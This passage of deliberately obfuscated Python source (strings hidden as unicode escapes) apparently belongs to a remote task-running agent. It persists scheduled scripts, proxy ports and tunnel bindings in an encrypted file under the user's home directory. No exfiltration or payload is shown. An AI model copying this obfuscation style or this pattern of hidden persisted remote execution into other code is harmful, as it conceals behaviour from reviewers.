        O0_var_1922 = TempKeyEciesPair(private_key=O0_var_1920[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')], public_key=O0_var_1920[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')])
    return TempKeyResponse(status=codecs.decode('\\u006f\\u006b', 'unicode_escape'), key_id=O0_var_1920[codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape')], ttl_seconds=O0_var_1920[codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape')], created_at=datetime.utcfromtimestamp(O0_var_1920[codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape')]).isoformat() + codecs.decode('\\u005a', 'unicode_escape'), expires_at=datetime.utcfromtimestamp(O0_var_1920[codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape')]).isoformat() + codecs.decode('\\u005a', 'unicode_escape'), ecdsa=O0_var_1921, ecies=O0_var_1922)

class TaskStore:
    MAGIC = codecs.decode('\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061\\u002d\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape')
    VERSION = 1
    OFF_VALUES = (codecs.decode('\\u006f\\u0066\\u0066', 'unicode_escape'), codecs.decode('\\u0030', 'unicode_escape'), codecs.decode('\\u006e\\u006f\\u006e\\u0065', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape'))

    def __init__(self):
        self.enabled = False
        self.locked = False
        self.path = None
        self.key = None
        self.last_saved_at = None
        self.hubregs = []
        self.proxyports = {}
        self.argobinds = []
        self._lock = threading.Lock()
        self._resolve_config()

    @staticmethod
    def _home_dir():
        for O0_var_1923 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
            if O0_var_1923 and os.path.isdir(O0_var_1923):
                return O0_var_1923
        return os.getcwd()

    def _resolve_config(self):
        O0_var_1924 = os.getenv(codecs.decode('\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
        if O0_var_1924.lower() in self.OFF_VALUES:
            Logger.info(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\U0001f4be\\u0020\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u003d\\u006f\\u0066\\u0066\\u002c\\u0020\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u5df2\\u663e\\u5f0f\\u5173\\u95ed', 'unicode_escape'))
            return
        O0_var_1925 = os.getenv(codecs.decode('\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
        if not O0_var_1924:
            O0_var_1924 = os.path.join(self._home_dir(), codecs.decode('\\u002e\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065\\u002e\\u0065\\u006e\\u0063', 'unicode_escape'))
        O0_var_1926 = self._parse_key(O0_var_1925)
        if O0_var_1926 is None:
            if O0_var_1925:
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059\\u0020\\u975e\\u6cd5\\u0020\\u0028\\u9700\\u0020\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002f\\u0068\\u0065\\u0078\\u0020\\u7f16\\u7801\\u7684\\u0020\\u0033\\u0032\\u0020\\u5b57\\u8282\\u0029\\u002c\\u0020\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u4fdd\\u6301\\u5173\\u95ed', 'unicode_escape'))
            else:
                Logger.info(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\U0001f4be\\u0020\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059\\u0020\\u672a\\u8bbe\\u7f6e\\u002c\\u0020\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u672a\\u542f\\u7528', 'unicode_escape'))
            return
        self.path = O0_var_1924
        self.key = O0_var_1926
        self.enabled = True
        Logger.info(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\U0001f4be\\u0020\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u5df2\\u542f\\u7528\\u003a\\u0020', 'unicode_escape') + str(self.path))

    @staticmethod
    def _parse_key(raw: str) -> Optional[bytes]:
        if not raw:
            return None
        import re
        try:
            if re.fullmatch(codecs.decode('\\u005b\\u0030\\u002d\\u0039\\u0061\\u002d\\u0066\\u0041\\u002d\\u0046\\u005d\\u007b\\u0036\\u0034\\u007d', 'unicode_escape'), raw):
                O0_var_1927 = bytes.fromhex(raw)
                return O0_var_1927 if len(O0_var_1927) == 32 else None
            O0_var_1928 = raw + codecs.decode('\\u003d', 'unicode_escape') * (-len(raw) % 4)
            O0_var_1927 = base64.b64decode(O0_var_1928, validate=True)
            return O0_var_1927 if len(O0_var_1927) == 32 else None
        except Exception:
            return None

    @classmethod
    def is_env_enabled(cls) -> bool:
        O0_var_1929 = os.getenv(codecs.decode('\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
        if O0_var_1929.lower() in cls.OFF_VALUES:
            return False
        return cls._parse_key(os.getenv(codecs.decode('\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()) is not None

    def _load_doc(self):
        if not self.enabled:
            return None
        with self._lock:
            try:
                if not os.path.isfile(self.path):
                    return None
                with open(self.path, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_1930:
                    O0_var_1931 = O0_var_1930.read().strip()
                if not O0_var_1931:
                    return None
                O0_var_1932 = CryptoManager.decrypt_data(O0_var_1931, self.key)
                if O0_var_1932 is None:
                    raise ValueError(codecs.decode('\\u89e3\\u5bc6\\u5931\\u8d25\\u0020\\u0028\\u5bc6\\u94a5\\u9519\\u8bef\\u6216\\u6570\\u636e\\u88ab\\u7be1\\u6539\\u0029', 'unicode_escape'))
                O0_var_1933 = json.loads(O0_var_1932)
                if not isinstance(O0_var_1933, dict) or O0_var_1933.get(codecs.decode('\\u006d\\u0061\\u0067\\u0069\\u0063', 'unicode_escape')) != self.MAGIC:
                    raise ValueError(codecs.decode('\\u006d\\u0061\\u0067\\u0069\\u0063\\u0020\\u4e0d\\u5339\\u914d', 'unicode_escape'))
                O0_var_1934 = int(O0_var_1933.get(codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), 0))
                if O0_var_1934 > self.VERSION:
                    self.locked = True
                    Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u5b58\\u50a8\\u7248\\u672c\\u0020', 'unicode_escape') + str(O0_var_1934) + codecs.decode('\\u0020\\u9ad8\\u4e8e\\u652f\\u6301\\u7248\\u672c\\u0020', 'unicode_escape') + str(self.VERSION) + codecs.decode('\\u002c\\u0020\\u4fdd\\u7559\\u539f\\u6587\\u4ef6\\u4e0d\\u8986\\u76d6\\u002c\\u0020\\u672c\\u6b21\\u4ee5\\u7a7a\\u4efb\\u52a1\\u542f\\u52a8\\u4e14\\u6301\\u4e45\\u5316\\u53ea\\u8bfb', 'unicode_escape'))
                    return None
                if O0_var_1934 != self.VERSION:
                    raise ValueError(codecs.decode('\\u4e0d\\u652f\\u6301\\u7684\\u7248\\u672c\\u0020', 'unicode_escape') + str(O0_var_1934))
                return O0_var_1933
            except Exception as exc:
                self._quarantine(codecs.decode('\\u52a0\\u8f7d\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(exc))
                return None

    def load(self):
        self.hubregs = []
        self.proxyports = {}
        self.argobinds = []
        O0_var_1935 = self._load_doc()
        if O0_var_1935 is None:
            return ([], {})
        O0_var_1936 = O0_var_1935.get(codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')) or {}
        O0_var_1937 = [str(O0_var_1938) for O0_var_1938 in O0_var_1936.get(codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape')) or []]
        O0_var_1939 = {str(O0_var_1940): str(O0_var_1941) for O0_var_1940, O0_var_1941 in (O0_var_1936.get(codecs.decode('\\u0063\\u0072\\u006f\\u006e\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape')) or {}).items()}
        O0_var_1942 = []
        for O0_var_1943 in O0_var_1936.get(codecs.decode('\\u0068\\u0075\\u0062\\u0072\\u0065\\u0067\\u0073', 'unicode_escape')) or []:
            if isinstance(O0_var_1943, dict) and isinstance(O0_var_1943.get(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')), str) and isinstance(O0_var_1943.get(codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')), str):
                O0_var_1944 = O0_var_1943.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'))
                O0_var_1942.append({codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): O0_var_1943[codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')], codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1943[codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')], codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): [int(O0_var_1945) for O0_var_1945 in O0_var_1944 if isinstance(O0_var_1945, (int, float)) and 1 <= int(O0_var_1945) <= 65535] if isinstance(O0_var_1944, list) else []})
        self.hubregs = O0_var_1942
        O0_var_1946 = O0_var_1936.get(codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'))
        if isinstance(O0_var_1946, dict):
            self.proxyports = {codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): [int(O0_var_1947) for O0_var_1947 in O0_var_1946.get(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')) or [] if isinstance(O0_var_1947, (int, float)) and 1 <= int(O0_var_1947) <= 65535], codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): [int(O0_var_1948) for O0_var_1948 in O0_var_1946.get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')) or [] if isinstance(O0_var_1948, (int, float)) and 1 <= int(O0_var_1948) <= 65535]}
        else:
            self.proxyports = {codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): [], codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): [int(O0_var_1949) for O0_var_1949 in O0_var_1946 or [] if isinstance(O0_var_1949, (int, float)) and 1 <= int(O0_var_1949) <= 65535]}
        O0_var_1950 = []
        for O0_var_1943 in O0_var_1936.get(codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u0062\\u0069\\u006e\\u0064\\u0073', 'unicode_escape')) or []:
            if isinstance(O0_var_1943, dict) and isinstance(O0_var_1943.get(codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')), str) and O0_var_1943.get(codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')) and isinstance(O0_var_1943.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape')), (int, float)) and (1 <= int(O0_var_1943.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'))) <= 65535):
                O0_var_1951 = {codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): int(O0_var_1943[codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape')]), codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1943[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')]}
                if isinstance(O0_var_1943.get(codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')), str) and O0_var_1943[codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')]:
                    O0_var_1951[codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')] = O0_var_1943[codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')]
                O0_var_1950.append(O0_var_1951)
        self.argobinds = O0_var_1950
        self.last_saved_at = O0_var_1935.get(codecs.decode('\\u0073\\u0061\\u0076\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'))
        Logger.info(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\U0001f4be\\u0020\\u5df2\\u6062\\u590d\\u6301\\u4e45\\u5316\\u4efb\\u52a1\\u003a\\u0020\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u003d', 'unicode_escape') + str(len(O0_var_1937)) + codecs.decode('\\u002c\\u0020\\u0063\\u0072\\u006f\\u006e\\u003d', 'unicode_escape') + str(len(O0_var_1939)) + codecs.decode('\\u002c\\u0020\\u0068\\u0075\\u0062\\u0072\\u0065\\u0067\\u003d', 'unicode_escape') + str(len(O0_var_1942)) + codecs.decode('\\u002c\\u0020\\u0070\\u0072\\u006f\\u0078\\u0079\\u0070\\u006f\\u0072\\u0074\\u0028\\u0068\\u0075\\u0062\\u0029\\u003d', 'unicode_escape') + str(len(self.proxyports['hub'])) + codecs.decode('\\u002c\\u0020\\u0070\\u0072\\u006f\\u0078\\u0079\\u0070\\u006f\\u0072\\u0074\\u0028\\u006c\\u006f\\u0063\\u0061\\u006c\\u0029\\u003d', 'unicode_escape') + str(len(self.proxyports['local'])) + codecs.decode('\\u002c\\u0020\\u0061\\u0072\\u0067\\u006f\\u0062\\u0069\\u006e\\u0064\\u003d', 'unicode_escape') + str(len(O0_var_1950)))
        return (O0_var_1937, O0_var_1939)

    def get_hubregs(self):
        return list(self.hubregs or [])

    def get_proxyports(self):
        return {codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): list((self.proxyports or {}).get(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')) or []), codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): list((self.proxyports or {}).get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')) or [])}

    def get_argobinds(self):
        return [dict(O0_var_1952) for O0_var_1952 in self.argobinds or []]

    def save_argobinds(self, O0_var_1953) -> bool:
        if not self.enabled or self.locked:
            return False
        O0_var_1954 = []
        for O0_var_1955 in O0_var_1953 or []:
            if not isinstance(O0_var_1955, dict) or not O0_var_1955.get(codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')):
                continue
            if not isinstance(O0_var_1955.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape')), (int, float)) or not 1 <= int(O0_var_1955[codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape')]) <= 65535:
                continue
            O0_var_1956 = {codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): int(O0_var_1955[codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape')]), codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): str(O0_var_1955[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')])}
            if isinstance(O0_var_1955.get(codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')), str) and O0_var_1955[codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')]:
                O0_var_1956[codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')] = str(O0_var_1955[codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')])
            O0_var_1954.append(O0_var_1956)
        self.argobinds = O0_var_1954
        return self.save(Config.onetasks, Config.crontasks)

    def save_proxyports(self, ports) -> bool:
        if not self.enabled or self.locked:
            return False

        def _clean(O0_var_1957):
            return sorted({int(O0_var_1958) for O0_var_1958 in O0_var_1957 or [] if isinstance(O0_var_1958, (int, float)) and 1 <= int(O0_var_1958) <= 65535})
        if isinstance(ports, dict):
            O0_var_1959 = {codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): _clean(ports.get(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'))), codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): _clean(ports.get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')))}
        else:
            O0_var_1959 = {codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): [], codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): _clean(ports)}
        self.proxyports = O0_var_1959
        return self.save(Config.onetasks, Config.crontasks)

    def save_hubregs(self, O0_var_1960) -> bool:
        if not self.enabled or self.locked:
            return False
        self.hubregs = [{codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): str(O0_var_1961[codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')]), codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): str(O0_var_1961[codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')]), codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): [int(O0_var_1962) for O0_var_1962 in O0_var_1961.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape')) or [] if isinstance(O0_var_1962, int) and 1 <= O0_var_1962 <= 65535]} for O0_var_1961 in O0_var_1960 or [] if isinstance(O0_var_1961, dict) and O0_var_1961.get(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')) and O0_var_1961.get(codecs.decode('\\u006b\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'))]
        return self.save(Config.onetasks, Config.crontasks)

    def _quarantine(self, reason: str):
        try:
            if self.path and os.path.isfile(self.path):
                O0_var_1963 = str(self.path) + codecs.decode('\\u002e\\u0062\\u0061\\u0064\\u002d', 'unicode_escape') + str(time.time_ns())
                os.replace(self.path, O0_var_1963)
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020', 'unicode_escape') + str(reason) + codecs.decode('\\u002c\\u0020\\u539f\\u6587\\u4ef6\\u5df2\\u9694\\u79bb\\u003a\\u0020', 'unicode_escape') + str(O0_var_1963))
            else:
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020', 'unicode_escape') + str(reason))
        except OSError as exc:
            Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020', 'unicode_escape') + str(reason) + codecs.decode('\\u002c\\u0020\\u4e14\\u9694\\u79bb\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(exc))

    def save(self, O0_var_1964, O0_var_1965) -> bool:
        if not self.enabled or self.locked:
            return False
        O0_var_1966 = None
        with self._lock:
            try:
                O0_var_1967 = {codecs.decode('\\u006d\\u0061\\u0067\\u0069\\u0063', 'unicode_escape'): self.MAGIC, codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): self.VERSION, codecs.decode('\\u0073\\u0061\\u0076\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.utcnow().strftime(codecs.decode('\\u0025\\u0059\\u002d\\u0025\\u006d\\u002d\\u0025\\u0064\\u0054\\u0025\\u0048\\u003a\\u0025\\u004d\\u003a\\u0025\\u0053\\u005a', 'unicode_escape')), codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'): {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): list(O0_var_1964 or []), codecs.decode('\\u0063\\u0072\\u006f\\u006e\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): dict(O0_var_1965 or {}), codecs.decode('\\u0068\\u0075\\u0062\\u0072\\u0065\\u0067\\u0073', 'unicode_escape'): list(self.hubregs or []), codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u0062\\u0069\\u006e\\u0064\\u0073', 'unicode_escape'): list(self.argobinds or []), codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): {codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): list((self.proxyports or {}).get(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')) or []), codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): list((self.proxyports or {}).get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')) or [])}}}
                O0_var_1968 = json.dumps(O0_var_1967, ensure_ascii=False).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                O0_var_1969 = CryptoManager.encrypt_data(O0_var_1968, self.key)
                O0_var_1970 = os.path.dirname(os.path.abspath(self.path))
                if O0_var_1970:
                    os.makedirs(O0_var_1970, exist_ok=True)
                O0_var_1966 = str(self.path) + codecs.decode('\\u002e\\u0074\\u006d\\u0070\\u002d', 'unicode_escape') + str(os.getpid())
                with open(O0_var_1966, codecs.decode('\\u0077', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_1971:
                    O0_var_1971.write(O0_var_1969)
                    O0_var_1971.flush()
                    os.fsync(O0_var_1971.fileno())
                os.replace(O0_var_1966, self.path)
                self.last_saved_at = O0_var_1967[codecs.decode('\\u0073\\u0061\\u0076\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape')]
                return True
            except Exception as exc:
                Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u4fdd\\u5b58\\u5931\\u8d25\\u0020\\u0028\\u5185\\u5b58\\u4efb\\u52a1\\u4e0d\\u53d7\\u5f71\\u54cd\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))
                try:
                    if O0_var_1966 and os.path.isfile(O0_var_1966):
                        os.remove(O0_var_1966)
                except Exception:
                    pass
                return False

class TaskManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u4efb\\u52a1\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u5185\\u5b58\\u5b58\\u50a8\\u0020\\u002b\\u0020\\u52a0\\u5bc6\\u6301\\u4e45\\u5316\\u0020\\u0028\\u0030\\u002e\\u0035\\u002e\\u0037\\u002c\\u0020\\u0064\\u006f\\u0063\\u0073\\u002f\\u0041\\u0050\\u0049\\u002e\\u004d\\u0044\\u0020\\u5341\\u4e09\\u0029\\u002c\\u0020\\u52a8\\u6001\\u6267\\u884c\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u542f\\u52a8\\u4efb\\u52a1\\u003a\\u0020\\u4e00\\u6b21\\u6027\\u6267\\u884c\\uff0c\\u6267\\u884c\\u540e\\u81ea\\u52a8\\u6e05\\u9664\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u5b9a\\u65f6\\u4efb\\u52a1\\u003a\\u0020\\u0043\\u0072\\u006f\\u006e\\u0074\\u0061\\u0062\\u0020\\u8868\\u8fbe\\u5f0f\\u8c03\\u5ea6\\uff0c\\u540e\\u53f0\\u5faa\\u73af\\u68c0\\u67e5\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, timeout: int=300, check_interval: int=30, O0_var_1972: int=None):
        self.timeout = timeout
        self.check_interval = check_interval
        self.max_log_size = O0_var_1972 or Config.MAX_TASK_LOG_SIZE
        Config.onetimetasks_log = deque(Config.onetimetasks_log, maxlen=self.max_log_size)
        Config.crontasks_log = deque(Config.crontasks_log, maxlen=self.max_log_size)
        self._cron_task: Optional[asyncio.Task] = None
        self._running = False
        self._executed_crons: set = set()
        self.store = TaskStore()
        try:
            O0_var_1973, O0_var_1974 = self.store.load()
        except Exception as exc:
            Logger.error(codecs.decode('\\u005b\\u0054\\u0061\\u0073\\u006b\\u0053\\u0074\\u006f\\u0072\\u0065\\u005d\\u0020\\u274c\\u0020\\u6062\\u590d\\u5f02\\u5e38\\u0020\\u0028\\u4ee5\\u7a7a\\u4efb\\u52a1\\u542f\\u52a8\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))
            O0_var_1973, O0_var_1974 = ([], {})
        if O0_var_1973:
            Config.onetasks = O0_var_1973
        if O0_var_1974:
            Config.crontasks = O0_var_1974
    TASK_META_LINE_RE = re.compile(codecs.decode('\\u005e\\u005c\\u0073\\u002a\\u0028\\u003f\\u003a\\u0023\\u007c\\u0072\\u0065\\u006d\\u005c\\u0062\\u0029\\u005c\\u0073\\u002a\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061\\u002d\\u0074\\u0061\\u0073\\u006b\\u003a\\u005c\\u0073\\u002a\\u0028\\u002e\\u002a\\u0029\\u0024', 'unicode_escape'), re.IGNORECASE)

    @staticmethod
    def _parse_task_meta(script: str):
        for O0_var_1975 in str(script or codecs.decode('', 'unicode_escape')).split(codecs.decode('\\u000a', 'unicode_escape'))[:3]:
            O0_var_1976 = TaskManager.TASK_META_LINE_RE.match(O0_var_1975)
            if not O0_var_1976:
                continue
            O0_var_1977 = re.search(codecs.decode('\\u005c\\u0062\\u0069\\u0064\\u003d\\u0028\\u005c\\u0064\\u002b\\u0029\\u005c\\u0062', 'unicode_escape'), O0_var_1976.group(1))
            if not O0_var_1977:
                return None
            O0_var_1978 = re.search(codecs.decode('\\u005c\\u0062\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u0064\\u003d\\u0028\\u005c\\u0064\\u002b\\u0029\\u005c\\u0062', 'unicode_escape'), O0_var_1976.group(1))
            return (O0_var_1977.group(1), int(O0_var_1978.group(1)) if O0_var_1978 else 0)
        return None

    @staticmethod
    def _strip_task_meta(script: str) -> str:
        O0_var_1979 = str(script or codecs.decode('', 'unicode_escape')).split(codecs.decode('\\u000a', 'unicode_escape'))
        for O0_var_1980, O0_var_1981 in enumerate(O0_var_1979[:3]):
            if TaskManager.TASK_META_LINE_RE.match(O0_var_1981):
                return codecs.decode('\\u000a', 'unicode_escape').join(O0_var_1979[:O0_var_1980] + O0_var_1979[O0_var_1980 + 1:])
        return str(script or codecs.decode('', 'unicode_escape'))

    @staticmethod
    def _with_task_meta(script: str, task_id: str, updated: int) -> str:
        O0_var_1982 = TaskManager._strip_task_meta(script)
        O0_var_1983 = codecs.decode('\\u0072\\u0065\\u006d', 'unicode_escape') if os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape') else codecs.decode('\\u0023', 'unicode_escape')
        O0_var_1984 = str(O0_var_1983) + codecs.decode('\\u0020\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061\\u002d\\u0074\\u0061\\u0073\\u006b\\u003a\\u0020\\u0069\\u0064\\u003d', 'unicode_escape') + str(task_id) + codecs.decode('\\u0020\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u0064\\u003d', 'unicode_escape') + str(updated)
        O0_var_1985 = O0_var_1982.split(codecs.decode('\\u000a', 'unicode_escape'))
        O0_var_1986 = 1 if O0_var_1985 and O0_var_1985[0].startswith(codecs.decode('\\u0023\\u0021', 'unicode_escape')) else 0
        O0_var_1985.insert(O0_var_1986, O0_var_1984)
        return codecs.decode('\\u000a', 'unicode_escape').join(O0_var_1985)

    @classmethod
    def _normalize_onetime_tasks(cls, incoming: List[str], stored: List[str]) -> List[str]:
        O0_var_1987 = int(time.time() * 1000)
        O0_var_1988 = [{codecs.decode('\\u0072\\u0061\\u0077', 'unicode_escape'): O0_var_1989, codecs.decode('\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'): cls._parse_task_meta(O0_var_1989), codecs.decode('\\u0065\\u0066\\u0066', 'unicode_escape'): cls._strip_task_meta(O0_var_1989).strip()} for O0_var_1989 in stored or []]
        O0_var_1990 = set()
        O0_var_1991: List[str] = []
        for O0_var_1992 in incoming or []:
            O0_var_1992 = str(O0_var_1992 or codecs.decode('', 'unicode_escape'))
